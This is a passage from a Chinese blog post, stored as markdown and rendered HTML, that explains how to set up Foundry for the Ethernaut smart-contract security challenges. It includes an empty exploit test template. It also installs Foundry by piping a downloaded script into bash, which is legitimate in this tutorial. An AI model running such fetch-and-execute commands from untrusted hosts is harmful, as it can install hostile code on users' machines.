配置复杂度 | 社区支持 |\n|------|------|----------|------------|----------|\n| **Foundry** | Rust | ⭐⭐⭐⭐⭐ | ⭐⭐☆☆☆ | ⭐⭐⭐⭐☆ |\n| Hardhat | JavaScript | ⭐⭐⭐☆☆ | ⭐⭐⭐☆☆ | ⭐⭐⭐⭐⭐ |\n| Truffle | JavaScript | ⭐⭐☆☆☆ | ⭐⭐⭐⭐☆ | ⭐⭐⭐☆☆ |\n\n## 🚀 Foundry 安装\n\n### 方法一：使用 Foundryup (推荐)\n\n```bash\n# 下载并安装 Foundryup\ncurl -L https://foundry.paradigm.xyz | bash\n\n# 重新加载 shell 或重启终端\nsource ~/.bashrc  # 或 source ~/.zshrc\n\n# 安装最新版本的 Foundry\nfoundryup\n\n# 验证安装\nforge --version\ncast --version\nanvil --version\n```\n\n### 方法二：从源码编译\n\n```bash\n# 克隆 Foundry 仓库\ngit clone https://github.com/foundry-rs/foundry\ncd foundry\n\n# 编译安装 (需要 Rust 环境)\ncargo build --release\ncargo install --path ./crates/forge --bin forge\ncargo install --path ./crates/cast --bin cast\ncargo install --path ./crates/anvil --bin anvil\n```\n\n### 方法三：使用包管理器\n\n```bash\n# macOS (Homebrew)\nbrew install foundry\n\n# Ubuntu/Debian (需要添加 PPA)\n# 暂不支持，建议使用方法一\n\n# Windows (需要 WSL)\n# 在 WSL 中执行方法一的步骤\n```\n\n## 📁 Ethernaut 项目结构\n\n### 克隆项目\n\n```bash\n# 克隆 Ethernaut Foundry Solutions 项目\ngit clone https://github.com/XuHugo/Ethernaut-Foundry-Solutions.git\ncd Ethernaut-Foundry-Solutions\n\n# 查看项目结构\ntree -L 2\n```\n\n### 项目目录结构\n\n```\nEthernaut-Foundry-Solutions/\n├── foundry.toml          # Foundry 配置文件\n├── .gitmodules          # Git 子模块配置\n├── README.md            # 项目说明\n├── lib/                 # 依赖库\n│   ├── forge-std/       # Foundry 标准库\n│   └── openzeppelin-contracts/  # OpenZeppelin 合约库\n├── src/                 # 源码目录\n│   ├── Fallback.sol     # 关卡原始合约\n│   ├── Fallout.sol\n│   └── ...\n├── test/                # 测试目录\n│   ├── FallbackTest.sol # 攻击测试合约\n│   ├── FalloutTest.sol\n│   └── ...\n├── script/              # 部署脚本\n└── solutions/           # 解题说明文档\n    ├── 01_Fallback_zh.md\n    └── ...\n```\n\n## ⚙️ 项目配置\n\n### Foundry 配置文件\n\n查看 `foundry.toml` 配置：\n\n```toml\n[profile.default]\nsrc = \"src\"\nout = \"out\"\nlibs = [\"lib\"]\nsolc = \"0.8.19\"\n\n# Etherscan API 配置 (可选)\n[etherscan]\nmainnet = { key = \"${API_KEY_ETHERSCAN}\" }\nsepolia = { key = \"${API_KEY_ETHERSCAN}\" }\n\n# RPC 端点配置\n[rpc_endpoints]\nmainnet = \"https://rpc.ankr.com/eth\"\nsepolia = \"https://rpc.ankr.com/eth_sepolia\"\n```\n\n### 安装依赖\n\n```bash\n# 安装项目依赖\nforge install\n\n# 手动安装特定依赖 (如果需要)\nforge install openzeppelin/openzeppelin-contracts\nforge install foundry-rs/forge-std\n\n# 更新依赖到最新版本\nforge update\n```\n\n## 🧪 基本使用\n\n### 编译合约\n\n```bash\n# 编译所有合约\nforge build\n\n# 编译特定合约\nforge build src/Fallback.sol\n\n# 查看编译输出\nls out/\n```\n\n### 运行测试\n\n```bash\n# 运行所有测试\nforge test\n\n# 运行特定测试合约\nforge test --match-contract FallbackTest\n\n# 详细输出 (多个 v 增加详细程度)\nforge test --match-contract FallbackTest -vvv\n\n# 运行特定测试函数\nforge test --match-test testFallbackExploit -vvv\n\n# 显示 gas 报告\nforge test --gas-report\n```\n\n### 使用 Anvil 本地测试网\n\n```bash\n# 启动本地测试网 (新终端)\nanvil\n\n# 在另一个终端中，针对本地网络运行测试\nforge test --fork-url http://localhost:8545\n```\n\n## 🔧 常用 Foundry 命令\n\n### Forge 命令\n\n```bash\n# 项目管理\nforge init my-project          # 初始化新项目\nforge build                    # 编译合约\nforge clean                    # 清理编译输出\n\n# 测试相关\nforge test                     # 运行测试\nforge test --watch            # 监视文件变化并自动测试\nforge coverage                # 代码覆盖率报告\n\n# 依赖管理\nforge install <dependency>     # 安装依赖\nforge remove <dependency>     # 移除依赖\nforge update                  # 更新依赖\n\n# 代码格式化\nforge fmt                     # 格式化 Solidity 代码\n```\n\n### Cast 命令\n\n```bash\n# 查询区块链信息\ncast block-number             # 获取最新区块号\ncast balance <address>        # 查询地址余额\ncast storage <address> <slot> # 读取存储槽\n\n# 调用合约\ncast call <address> <signature> [args]  # 只读调用\ncast send <address> <signature> [args]  # 状态变更调用\n\n# 工具函数\ncast keccak \"function_signature()\"      # 计算函数选择器\ncast abi-encode \"func(uint256)\" 123     # ABI 编码\n```\n\n### Anvil 命令\n\n```bash\n# 启动本地测试网\nanvil                         # 默认配置\nanvil --port 8545            # 指定端口\nanvil --accounts 20          # 指定账户数量\nanvil --balance 1000         # 每个账户初始余额 (ETH)\n\n# 从特定状态分叉\nanvil --fork-url https://rpc.ankr.com/eth\nanvil --fork-url https://rpc.ankr.com/eth --fork-block-number 19000000\n```\n\n## 🎯 Ethernaut 专用配置\n\n### 环境变量配置\n\n创建 `.env` 文件：\n\n```bash\n# .env 文件\nETHERSCAN_API_KEY=your_etherscan_api_key\nMAINNET_RPC_URL=https://rpc.ankr.com/eth\nSEPOLIA_RPC_URL=https://rpc.ankr.com/eth_sepolia\nPRIVATE_KEY=your_private_key_for_testing\n```\n\n加载环境变量：\n\n```bash\n# 在 shell 中加载\nsource .env\n\n# 或在 foundry.toml 中配置自动加载\n[profile.default]\nenv_file = \".env\"\n```\n\n### 测试模板\n\n创建标准测试文件模板：\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\nimport \"forge-std/Test.sol\";\nimport \"../src/TargetContract.sol\";\n\ncontract TargetContractTest is Test {\n    TargetContract public instance;\n    address public attacker = makeAddr(\"attacker\");\n    \n    function setUp() public {\n        // 部署目标合约\n        instance = new TargetContract();\n        \n        // 初始化攻击者账户\n        vm.deal(attacker, 10 ether);\n    }\n    \n    function testExploit() public {\n        vm.startPrank(attacker);\n        \n        // 攻击逻辑\n        \n        vm.stopPrank();\n        \n        // 验证攻击成功\n        assertTrue(/* 验证条件 */);\n    }\n}\n```\n\n## 🐛 常见问题解决\n\n### 编译错误\n\n```bash\n# 清理并重新编译\nforge clean && forge build\n\n# 检查 Solidity 版本兼容性\nforge build --force\n\n# 查看详细错误信息\nforge build --verbose\n```\n\n### 依赖问题\n\n```bash\n# 重新安装依赖\nrm -rf lib/\nforge install\n\n# 检查 Git 子模块状态\ngit submodule status\ngit submodule update --init --recursive\n```\n\n### 测试失败\n\n```bash\n# 增加详细输出\nforge test -vvvv\n\n# 使用调试器\nforge test --debug <test_function>\n\n# 检查 gas 使用情况\nforge test --gas-report\n```\n\n## 📚 进阶配置\n\n### 多版本 Solidity 支持\n\n```toml\n# foundry.toml\n[profile.default]\nsolc = \"0.8.19\"\n\n[profile.legacy]\nsolc = \"0.6.12\"\n```\n\n### 自定义测试配置\n\n```toml\n[profile.default.fuzz]\nruns = 1000\nmax_test_rejects = 65536\n\n[profile.default.invariant]\nruns = 256\ndepth = 32\n```\n\n### Gas 优化设置\n\n```toml\n[profile.default.optimizer]\nenabled = true\nruns = 200\n\n[profile.default.model_checker]\ncontracts = { \"/path/to/project/src/Contract.sol\" = [ \"Contract\" ] }\nengine = \"chc\"\ntargets = [ \"assert\", \"underflow\", \"overflow\", \"divByZero\" ]\n```\n\n## 🎓 总结\n\n现在您已经完成了 Foundry 开发环境的搭建，可以开始 Ethernaut 安全挑战的学习之旅了！\n\n### 下一步：\n\n1. **熟悉 Foundry 基本命令**\n2. **运行第一个测试**: `forge test --match-contract FallbackTest -vvv`\n3. **开始学习**: [Level 1 - Fallback](/2025/01/25/ethernaut-level-01-fallback/)\n\n---\n\n## 🔗 相关链接\n\n- **[Foundry 官方文档](https://book.getfoundry.sh/)**\n- **[Foundry GitHub](https://github.com/foundry-rs/foundry)**\n- **[下一篇: Level 1 - Fallback](/2025/01/25/ethernaut-level-01-fallback/)**\n- **[系列目录: Ethernaut Foundry Solutions](/2025/01/25/ethernaut-foundry-solutions-series/)**\n\n---\n\n*工欲善其事，必先利其器。掌握好工具，才能更好地学习智能合约安全。* 🔧","source":"_posts/foundry-setup-guide.md","raw":"---\ntitle: 'Foundry 环境搭建与 Ethernaut 项目配置'\ndate: 2025-01-25 14:05:00\nupdated: 2025-01-25 14:05:00\ncategories:\n  - Web3开发\n  - 工具配置\n  - Ethernaut\ntags:\n  - Foundry\n  - 环境搭建\n  - Ethernaut\n  - Solidity\n  - Web3开发\n  - 测试框架\nseries: Ethernaut Foundry Solutions\nexcerpt: \"详细介绍如何安装和配置 Foundry 开发环境，为学习 Ethernaut 智能合约安全挑战做好准备。\"\n---\n\n# 🛠️ Foundry 环境搭建与 Ethernaut 项目配置\n\n> 在开始 Ethernaut 安全挑战之前，我们需要搭建一个完整的 Foundry 开发环境。本文将详细介绍从零开始的完整配置流程。\n\n## 📚 什么是 Foundry?\n\n**Foundry** 是一个用 Rust 编写的快速、可移植和模块化的以太坊开发工具包，包含：\n\n- **Forge**: 测试框架\n- **Cast**: 瑞士军刀般的 RPC 工具\n- **Anvil**: 本地测试网络\n- **Chisel**: Solidity REPL\n\n### 与其他工具对比\n\n| 工具 | 语言 | 测试速度 | 配置复杂度 | 社区支持 |\n|------|------|----------|------------|----------|\n| **Foundry** | Rust | ⭐⭐⭐⭐⭐ | ⭐⭐☆☆☆ | ⭐⭐⭐⭐☆ |\n| Hardhat | JavaScript | ⭐⭐⭐☆☆ | ⭐⭐⭐☆☆ | ⭐⭐⭐⭐⭐ |\n| Truffle | JavaScript | ⭐⭐☆☆☆ | ⭐⭐⭐⭐☆ | ⭐⭐⭐☆☆ |\n\n## 🚀 Foundry 安装\n\n### 方法一：使用 Foundryup (推荐)\n\n```bash\n# 下载并安装 Foundryup\ncurl -L https://foundry.paradigm.xyz | bash\n\n# 重新加载 shell 或重启终端\nsource ~/.bashrc  # 或 source ~/.zshrc\n\n# 安装最新版本的 Foundry\nfoundryup\n\n# 验证安装\nforge --version\ncast --version\nanvil --version\n```\n\n### 方法二：从源码编译\n\n```bash\n# 克隆 Foundry 仓库\ngit clone https://github.com/foundry-rs/foundry\ncd foundry\n\n# 编译安装 (需要 Rust 环境)\ncargo build --release\ncargo install --path ./crates/forge --bin forge\ncargo install --path ./crates/cast --bin cast\ncargo install --path ./crates/anvil --bin anvil\n```\n\n### 方法三：使用包管理器\n\n```bash\n# macOS (Homebrew)\nbrew install foundry\n\n# Ubuntu/Debian (需要添加 PPA)\n# 暂不支持，建议使用方法一\n\n# Windows (需要 WSL)\n# 在 WSL 中执行方法一的步骤\n```\n\n## 📁 Ethernaut 项目结构\n\n### 克隆项目\n\n```bash\n# 克隆 Ethernaut Foundry Solutions 项目\ngit clone https://github.com/XuHugo/Ethernaut-Foundry-Solutions.git\ncd Ethernaut-Foundry-Solutions\n\n# 查看项目结构\ntree -L 2\n```\n\n### 项目目录结构\n\n```\nEthernaut-Foundry-Solutions/\n├── foundry.toml          # Foundry 配置文件\n├── .gitmodules          # Git 子模块配置\n├── README.md            # 项目说明\n├── lib/                 # 依赖库\n│   ├── forge-std/       # Foundry 标准库\n│   └── openzeppelin-contracts/  # OpenZeppelin 合约库\n├── src/                 # 源码目录\n│   ├── Fallback.sol     # 关卡原始合约\n│   ├── Fallout.sol\n│   └── ...\n├── test/                # 测试目录\n│   ├── FallbackTest.sol # 攻击测试合约\n│   ├── FalloutTest.sol\n│   └── ...\n├── script/              # 部署脚本\n└── solutions/           # 解题说明文档\n    ├── 01_Fallback_zh.md\n    └── ...\n```\n\n## ⚙️ 项目配置\n\n### Foundry 配置文件\n\n查看 `foundry.toml` 配置：\n\n```toml\n[profile.default]\nsrc = \"src\"\nout = \"out\"\nlibs = [\"lib\"]\nsolc = \"0.8.19\"\n\n# Etherscan API 配置 (可选)\n[etherscan]\nmainnet = { key = \"${API_KEY_ETHERSCAN}\" }\nsepolia = { key = \"${API_KEY_ETHERSCAN}\" }\n\n# RPC 端点配置\n[rpc_endpoints]\nmainnet = \"https://rpc.ankr.com/eth\"\nsepolia = \"https://rpc.ankr.com/eth_sepolia\"\n```\n\n### 安装依赖\n\n```bash\n# 安装项目依赖\nforge install\n\n# 手动安装特定依赖 (如果需要)\nforge install openzeppelin/openzeppelin-contracts\nforge install foundry-rs/forge-std\n\n# 更新依赖到最新版本\nforge update\n```\n\n## 🧪 基本使用\n\n### 编译合约\n\n```bash\n# 编译所有合约\nforge build\n\n# 编译特定合约\nforge build src/Fallback.sol\n\n# 查看编译输出\nls out/\n```\n\n### 运行测试\n\n```bash\n# 运行所有测试\nforge test\n\n# 运行特定测试合约\nforge test --match-contract FallbackTest\n\n# 详细输出 (多个 v 增加详细程度)\nforge test --match-contract FallbackTest -vvv\n\n# 运行特定测试函数\nforge test --match-test testFallbackExploit -vvv\n\n# 显示 gas 报告\nforge test --gas-report\n```\n\n### 使用 Anvil 本地测试网\n\n```bash\n# 启动本地测试网 (新终端)\nanvil\n\n# 在另一个终端中，针对本地网络运行测试\nforge test --fork-url http://localhost:8545\n```\n\n## 🔧 常用 Foundry 命令\n\n### Forge 命令\n\n```bash\n# 项目管理\nforge init my-project          # 初始化新项目\nforge build                    # 编译合约\nforge clean                    # 清理编译输出\n\n# 测试相关\nforge test                     # 运行测试\nforge test --watch            # 监视文件变化并自动测试\nforge coverage                # 代码覆盖率报告\n\n# 依赖管理\nforge install <dependency>     # 安装依赖\nforge remove <dependency>     # 移除依赖\nforge update                  # 更新依赖\n\n# 代码格式化\nforge fmt                     # 格式化 Solidity 代码\n```\n\n### Cast 命令\n\n```bash\n# 查询区块链信息\ncast block-number             # 获取最新区块号\ncast balance <address>        # 查询地址余额\ncast storage <address> <slot> # 读取存储槽\n\n# 调用合约\ncast call <address> <signature> [args]  # 只读调用\ncast send <address> <signature> [args]  # 状态变更调用\n\n# 工具函数\ncast keccak \"function_signature()\"      # 计算函数选择器\ncast abi-encode \"func(uint256)\" 123     # ABI 编码\n```\n\n### Anvil 命令\n\n```bash\n# 启动本地测试网\nanvil                         # 默认配置\nanvil --port 8545            # 指定端口\nanvil --accounts 20          # 指定账户数量\nanvil --balance 1000         # 每个账户初始余额 (ETH)\n\n# 从特定状态分叉\nanvil --fork-url https://rpc.ankr.com/eth\nanvil --fork-url https://rpc.ankr.com/eth --fork-block-number 19000000\n```\n\n## 🎯 Ethernaut 专用配置\n\n### 环境变量配置\n\n创建 `.env` 文件：\n\n```bash\n# .env 文件\nETHERSCAN_API_KEY=your_etherscan_api_key\nMAINNET_RPC_URL=https://rpc.ankr.com/eth\nSEPOLIA_RPC_URL=https://rpc.ankr.com/eth_sepolia\nPRIVATE_KEY=your_private_key_for_testing\n```\n\n加载环境变量：\n\n```bash\n# 在 shell 中加载\nsource .env\n\n# 或在 foundry.toml 中配置自动加载\n[profile.default]\nenv_file = \".env\"\n```\n\n### 测试模板\n\n创建标准测试文件模板：\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\nimport \"forge-std/Test.sol\";\nimport \"../src/TargetContract.sol\";\n\ncontract TargetContractTest is Test {\n    TargetContract public instance;\n    address public attacker = makeAddr(\"attacker\");\n    \n    function setUp() public {\n        // 部署目标合约\n        instance = new TargetContract();\n        \n        // 初始化攻击者账户\n        vm.deal(attacker, 10 ether);\n    }\n    \n    function testExploit() public {\n        vm.startPrank(attacker);\n        \n        // 攻击逻辑\n        \n        vm.stopPrank();\n        \n        // 验证攻击成功\n        assertTrue(/* 验证条件 */);\n    }\n}\n```\n\n## 🐛 常见问题解决\n\n### 编译错误\n\n```bash\n# 清理并重新编译\nforge clean && forge build\n\n# 检查 Solidity 版本兼容性\nforge build --force\n\n# 查看详细错误信息\nforge build --verbose\n```\n\n### 依赖问题\n\n```bash\n# 重新安装依赖\nrm -rf lib/\nforge install\n\n# 检查 Git 子模块状态\ngit submodule status\ngit submodule update --init --recursive\n```\n\n### 测试失败\n\n```bash\n# 增加详细输出\nforge test -vvvv\n\n# 使用调试器\nforge test --debug <test_function>\n\n# 检查 gas 使用情况\nforge test --gas-report\n```\n\n## 📚 进阶配置\n\n### 多版本 Solidity 支持\n\n```toml\n# foundry.toml\n[profile.default]\nsolc = \"0.8.19\"\n\n[profile.legacy]\nsolc = \"0.6.12\"\n```\n\n### 自定义测试配置\n\n```toml\n[profile.default.fuzz]\nruns = 1000\nmax_test_rejects = 65536\n\n[profile.default.invariant]\nruns = 256\ndepth = 32\n```\n\n### Gas 优化设置\n\n```toml\n[profile.default.optimizer]\nenabled = true\nruns = 200\n\n[profile.default.model_checker]\ncontracts = { \"/path/to/project/src/Contract.sol\" = [ \"Contract\" ] }\nengine = \"chc\"\ntargets = [ \"assert\", \"underflow\", \"overflow\", \"divByZero\" ]\n```\n\n## 🎓 总结\n\n现在您已经完成了 Foundry 开发环境的搭建，可以开始 Ethernaut 安全挑战的学习之旅了！\n\n### 下一步：\n\n1. **熟悉 Foundry 基本命令**\n2. **运行第一个测试**: `forge test --match-contract FallbackTest -vvv`\n3. **开始学习**: [Level 1 - Fallback](/2025/01/25/ethernaut-level-01-fallback/)\n\n---\n\n## 🔗 相关链接\n\n- **[Foundry 官方文档](https://book.getfoundry.sh/)**\n- **[Foundry GitHub](https://github.com/foundry-rs/foundry)**\n- **[下一篇: Level 1 - Fallback](/2025/01/25/ethernaut-level-01-fallback/)**\n- **[系列目录: Ethernaut Foundry Solutions](/2025/01/25/ethernaut-foundry-solutions-series/)**\n\n---\n\n*工欲善其事，必先利其器。掌握好工具，才能更好地学习智能合约安全。* 🔧","slug":"foundry-setup-guide","published":1,"comments":1,"layout":"post","photos":[],"_id":"cmfc7zbpo0021bf5qfluybngv","content":"<h1 id=\"🛠️-Foundry-环境搭建与-Ethernaut-项目配置\"><a href=\"#🛠️-Foundry-环境搭建与-Ethernaut-项目配置\" class=\"headerlink\" title=\"🛠️ Foundry 环境搭建与 Ethernaut 项目配置\"></a>🛠️ Foundry 环境搭建与 Ethernaut 项目配置</h1><blockquote>\n<p>在开始 Ethernaut 安全挑战之前，我们需要搭建一个完整的 Foundry 开发环境。本文将详细介绍从零开始的完整配置流程。</p>\n</blockquote>\n<h2 id=\"📚-什么是-Foundry\"><a href=\"#📚-什么是-Foundry\" class=\"headerlink\" title=\"📚 什么是 Foundry?\"></a>📚 什么是 Foundry?</h2><p><strong>Foundry</strong> 是一个用 Rust 编写的快速、可移植和模块化的以太坊开发工具包，包含：</p>\n<ul>\n<li><strong>Forge</strong>: 测试框架</li>\n<li><strong>Cast</strong>: 瑞士军刀般的 RPC 工具</li>\n<li><strong>Anvil</strong>: 本地测试网络</li>\n<li><strong>Chisel</strong>: Solidity REPL</li>\n</ul>\n<h3 id=\"与其他工具对比\"><a href=\"#与其他工具对比\" class=\"headerlink\" title=\"与其他工具对比\"></a>与其他工具对比</h3><table>\n<thead>\n<tr>\n<th>工具</th>\n<th>语言</th>\n<th>测试速度</th>\n<th>配置复杂度</th>\n<th>社区支持</th>\n</tr>\n</thead>\n<tbody><tr>\n<td><strong>Foundry</strong></td>\n<td>Rust</td>\n<td>⭐⭐⭐⭐⭐</td>\n<td>⭐⭐☆☆☆</td>\n<td>⭐⭐⭐⭐☆</td>\n</tr>\n<tr>\n<td>Hardhat</td>\n<td>JavaScript</td>\n<td>⭐⭐⭐☆☆</td>\n<td>⭐⭐⭐☆☆</td>\n<td>⭐⭐⭐⭐⭐</td>\n</tr>\n<tr>\n<td>Truffle</td>\n<td>JavaScript</td>\n<td>⭐⭐☆☆☆</td>\n<td>⭐⭐⭐⭐☆</td>\n<td>⭐⭐⭐☆☆</td>\n</tr>\n</tbody></table>\n<h2 id=\"🚀-Foundry-安装\"><a href=\"#🚀-Foundry-安装\" class=\"headerlink\" title=\"🚀 Foundry 安装\"></a>🚀 Foundry 安装</h2><h3 id=\"方法一：使用-Foundryup-推荐\"><a href=\"#方法一：使用-Foundryup-推荐\" class=\"headerlink\" title=\"方法一：使用 Foundryup (推荐)\"></a>方法一：使用 Foundryup (推荐)</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 下载并安装 Foundryup</span></span><br><span class=\"line\">curl -L https://foundry.paradigm.xyz | bash</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 重新加载 shell 或重启终端</span></span><br><span class=\"line\"><span class=\"built_in\">source</span> ~/.bashrc  <span class=\"comment\"># 或 source ~/.zshrc</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 安装最新版本的 Foundry</span></span><br><span class=\"line\">foundryup</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 验证安装</span></span><br><span class=\"line\">forge --version</span><br><span class=\"line\">cast --version</span><br><span class=\"line\">anvil --version</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"方法二：从源码编译\"><a href=\"#方法二：从源码编译\" class=\"headerlink\" title=\"方法二：从源码编译\"></a>方法二：从源码编译</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 克隆 Foundry 仓库</span></span><br><span class=\"line\">git <span class=\"built_in\">clone</span> https://github.com/foundry-rs/foundry</span><br><span class=\"line\"><span class=\"built_in\">cd</span> foundry</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 编译安装 (需要 Rust 环境)</span></span><br><span class=\"line\">cargo build --release</span><br><span class=\"line\">cargo install --path ./crates/forge --bin forge</span><br><span class=\"line\">cargo install --path ./crates/cast --bin cast</span><br><span class=\"line\">cargo install --path ./crates/anvil --bin anvil</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"方法三：使用包管理器\"><a href=\"#方法三：使用包管理器\" class=\"headerlink\" title=\"方法三：使用包管理器\"></a>方法三：使用包管理器</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># macOS (Homebrew)</span></span><br><span class=\"line\">brew install foundry</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># Ubuntu/Debian (需要添加 PPA)</span></span><br><span class=\"line\"><span class=\"comment\"># 暂不支持，建议使用方法一</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># Windows (需要 WSL)</span></span><br><span class=\"line\"><span class=\"comment\"># 在 WSL 中执行方法一的步骤</span></span><br></pre></td></tr></table></figure>\n\n<h2 id=\"📁-Ethernaut-项目结构\"><a href=\"#📁-Ethernaut-项目结构\" class=\"headerlink\" title=\"📁 Ethernaut 项目结构\"></a>📁 Ethernaut 项目结构</h2><h3 id=\"克隆项目\"><a href=\"#克隆项目\" class=\"headerlink\" title=\"克隆项目\"></a>克隆项目</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 克隆 Ethernaut Foundry Solutions 项目</span></span><br><span class=\"line\">git <span class=\"built_in\">clone</span> https://github.com/XuHugo/Ethernaut-Foundry-Solutions.git</span><br><span class=\"line\"><span class=\"built_in\">cd</span> Ethernaut-Foundry-Solutions</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 查看项目结构</span></span><br><span class=\"line\">tree -L 2</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"项目目录结构\"><a href=\"#项目目录结构\" class=\"headerlink\" title=\"项目目录结构\"></a>项目目录结构</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Ethernaut-Foundry-Solutions/</span><br><span class=\"line\">├── foundry.toml          # Foundry 配置文件</span><br><span class=\"line\">├── .gitmodules          # Git 子模块配置</span><br><span class=\"line\">├── README.md            # 项目说明</span><br><span class=\"line\">├── lib/                 # 依赖库</span><br><span class=\"line\">│   ├── forge-std/       # Foundry 标准库</span><br><span class=\"line\">│   └── openzeppelin-contracts/  # OpenZeppelin 合约库</span><br><span class=\"line\">├── src/                 # 源码目录</span><br><span class=\"line\">│   ├── Fallback.sol     # 关卡原始合约</span><br><span class=\"line\">│   ├── Fallout.sol</span><br><span class=\"line\">│   └── ...</span><br><span class=\"line\">├── test/                # 测试目录</span><br><span class=\"line\">│   ├── FallbackTest.sol # 攻击测试合约</span><br><span class=\"line\">│   ├── FalloutTest.sol</span><br><span class=\"line\">│   └── ...</span><br><span class=\"line\">├── script/              # 部署脚本</span><br><span class=\"line\">└── solutions/           # 解题说明文档</span><br><span class=\"line\">    ├── 01_Fallback_zh.md</span><br><span class=\"line\">    └── ...</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"⚙️-项目配置\"><a href=\"#⚙️-项目配置\" class=\"headerlink\" title=\"⚙️ 项目配置\"></a>⚙️ 项目配置</h2><h3 id=\"Foundry-配置文件\"><a href=\"#Foundry-配置文件\" class=\"headerlink\" title=\"Foundry 配置文件\"></a>Foundry 配置文件</h3><p>查看 <code>foundry.toml</code> 配置：</p>\n<figure class=\"highlight toml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"section\">[profile.default]</span></span><br><span class=\"line\"><span class=\"attr\">src</span> = <span class=\"string\">&quot;src&quot;</span></span><br><span class=\"line\"><span class=\"attr\">out</span> = <span class=\"string\">&quot;out&quot;</span></span><br><span class=\"line\"><span class=\"attr\">libs</span> = [<span class=\"string\">&quot;lib&quot;</span>]</span><br><span class=\"line\"><span class=\"attr\">solc</span> = <span class=\"string\">&quot;0.8.19&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># Etherscan API 配置 (可选)</span></span><br><span class=\"line\"><span class=\"section\">[etherscan]</span></span><br><span class=\"line\"><span class=\"attr\">mainnet</span> = &#123; key = <span class=\"string\">&quot;$&#123;API_KEY_ETHERSCAN&#125;&quot;</span> &#125;</span><br><span class=\"line\"><span class=\"attr\">sepolia</span> = &#123; key = <span class=\"string\">&quot;$&#123;API_KEY_ETHERSCAN&#125;&quot;</span> &#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># RPC 端点配置</span></span><br><span class=\"line\"><span class=\"section\">[rpc_endpoints]</span></span><br><span class=\"line\"><span class=\"attr\">mainnet</span> = <span class=\"string\">&quot;https://rpc.ankr.com/eth&quot;</span></span><br><span class=\"line\"><span class=\"attr\">sepolia</span> = <span class=\"string\">&quot;https://rpc.ankr.com/eth_sepolia&quot;</span></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"安装依赖\"><a href=\"#安装依赖\" class=\"headerlink\" title=\"安装依赖\"></a>安装依赖</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 安装项目依赖</span></span><br><span class=\"line\">forge install</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 手动安装特定依赖 (如果需要)</span></span><br><span class=\"line\">forge install openzeppelin/openzeppelin-contracts</span><br><span class=\"line\">forge install foundry-rs/forge-std</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 更新依赖到最新版本</span></span><br><span class=\"line\">forge update</span><br></pre></td></tr></table></figure>\n\n<h2 